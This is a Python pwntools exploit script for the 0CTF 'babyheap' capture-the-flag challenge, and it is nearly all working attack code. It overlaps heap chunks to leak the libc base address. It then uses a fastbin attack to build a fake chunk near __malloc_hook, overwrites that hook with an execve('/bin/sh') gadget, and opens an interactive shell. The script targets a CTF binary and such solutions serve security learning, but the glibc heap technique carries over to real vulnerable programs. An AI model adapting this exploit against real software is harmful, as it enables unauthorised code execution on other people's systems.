#!/usr/bin/python 
# 0ctfbabyheap
__author__ = 'TaQini@le-xing'
from pwn import * 
#context.log_level = 'debug'
p = process(['./babyheap'], env={"LD_PRELOAD":"./libc.so"})

def sl(data):
    p.sendline(data)
def sd(data):
    p.send(data)
def ru(s):
    return p.recvuntil(s)
def add(size):
    ru('Command: ')
    sl('1')
    ru('Size: ')
    sl(str(size))
def fill(index, size, content):
    ru('Command: ')
    sl('2')
    ru('Index: ')
    sl(str(index))
    ru('Size: ')
    sl(str(size))
    ru('Content: ')
    sl(content)
def free(index):
    ru('Command: ')
    sl('3')
    ru('Index: ')
    sl(str(index))
def dump(index):
    ru('Command: ')
    sl('4')
    ru('Index: ')
    sl(str(index))
    return ru('1. Allocate')

ru('Exit')
gdb.attach(p)

# == leak libc base ==
add(0x60)  # chunk0 (fast chunk)  sz = 0x70
add(0x40) # chunk1 (small chunk) sz = 0x110
add(0x100) # chunk2 (small chunk) sz = 0x110

data1 = 'B'*0x60+p64(0)+p64(0x111) # overlap chunk2
fill(1,len(data1),data1) 

data0 = 'A'*0x60+p64(0)+p64(0x71) # overlap chunk1
fill(0,len(data0),data0)

free(1)   # free chunk1 (add item to fastbinY)
add(0x60) # chunk1 (remove item from fastbinY)

data1 = 'A'*0x40+p64(0)+p64(0x111) # repair head of chunk2 
fill(1,len(data1),data1)

add(0x100) # chunk 3 
free(2) # free chunk2

tmp = dump(1) # chunk1 contains &bin ( -> libc)
libc = u64(tmp[0x5a:0x62]) - 0x3a5678
log.success('libc_base = ' + hex(libc))


# == fast bin attack ==
#pop_rdi = libc + 0x000b7baa # pop rdi; ret;
#binsh = libc + 0x001633e8
#system = libc + 0x0041490
execve_binsh = libc + 0x00041374
__malloc_hook = libc + 0x003a5610

add(0x100) # chunk 2
add(0x60)  # chunk 4 fast chunk
add(0x60)  # chunk 5 fast chunk

free(5)
free(4)

add(0x60) # chunk 5
addr = __malloc_hook - 27 - 0x8
data4 = 'C'*0x60 + p64(0) + p64(0x71) + p64(addr) + p64(0) # overwrite fd of chunk5
fill(4,len(data4),data4)

add(0x60) # chunk 4

add(0x60) # chunk 6
log.success('got ptr = ' + hex(addr+0x10))

#rop = p64(pop_rdi) + p64(binsh) + p64(system)
data6 = 'D'*3 + p64(0x0) + p64(0x0) + p64(execve_binsh)
# 'DDD' | __memalign_hook | __realloc_hook | __malloc_hook

fill(6,len(data6),data6)

#add(0x233) # call *__malloc_hook

p.interactive()

